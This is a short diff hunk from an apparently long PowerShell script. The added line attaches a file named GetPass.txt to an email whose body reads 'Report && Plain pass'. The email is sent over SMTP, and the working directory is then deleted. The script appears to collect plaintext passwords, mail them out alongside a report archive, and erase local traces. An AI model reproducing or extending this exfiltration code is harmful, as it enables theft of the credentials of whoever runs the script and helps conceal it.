@@ -2888,6 +2888,8 @@ $ReportEmail.Body = 'Report && Plain pass'
 
 $ReportEmail.Attachments.Add('D:\Report.zip')
 
+$ReportEmail.Attachments.Add('D:\GetPass.txt')
+
 $SMTPInfo.Send($ReportEmail)
 
 Remove-Item $fileSaveDir -recurse
